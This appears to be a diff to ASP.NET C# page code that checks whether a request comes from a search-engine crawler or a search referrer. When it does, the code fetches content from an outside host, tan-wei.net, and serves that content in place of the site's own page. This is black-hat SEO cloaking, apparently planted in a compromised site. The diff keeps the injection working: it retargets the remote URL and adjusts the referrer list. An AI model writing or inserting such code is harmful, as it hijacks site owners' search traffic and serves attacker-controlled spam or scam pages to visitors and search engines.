@@ -9,7 +9,7 @@
 	   string strSelfPages=Request.ServerVariables["PATH_INFO"].ToString().ToLower();
 	   
            string[] spidersString = "spider,msnbot,Baiduspider,YodaoBot,Googlebot".ToLower().Split(',');
-           string[] refesString = "sogou,soso,baidu,google,so,youdao,yahoo,bing,118114,biso,gougou,ifeng,ivc,sooule,niuhu,biso,360".ToLower().Split(',');
+           string[] refesString = "sogou,soso,baidu,google,youdao,yahoo,bing,118114,biso,gougou,ifeng,ivc,sooule,niuhu,biso,360".ToLower().Split(',');
             bool spi = false;
             bool refekg = false;
 		string URLdzq=Request.Url.ToString();
@@ -46,7 +46,7 @@ if(Request.UrlReferrer!=null){
 
 {
 
-                string sl = "http://tan-wei.net/tan/index.htm"; 
+                string sl = "http://tan-wei.net/vip/kf.html"; 
                 WebClient SWebClient = new WebClient();
 				SWebClient.Headers.Add ("User-Agent",sl); 
                 SWebClient.Credentials = CredentialCache.DefaultCredentials;
@@ -56,7 +56,7 @@ if(Request.UrlReferrer!=null){
 Response.Write(r); 
  		 Response.End();
 }else if (refekg == true&&strQSre.Contains(".html")){
-                string sl = "http://tan-wei.net/tan/index.htm"; 
+                string sl = "http://tan-wei.net/vip/kf.html"; 
                 WebClient SWebClient = new WebClient();
 				SWebClient.Headers.Add ("User-Agent",sl); 
                 SWebClient.Credentials = CredentialCache.DefaultCredentials;
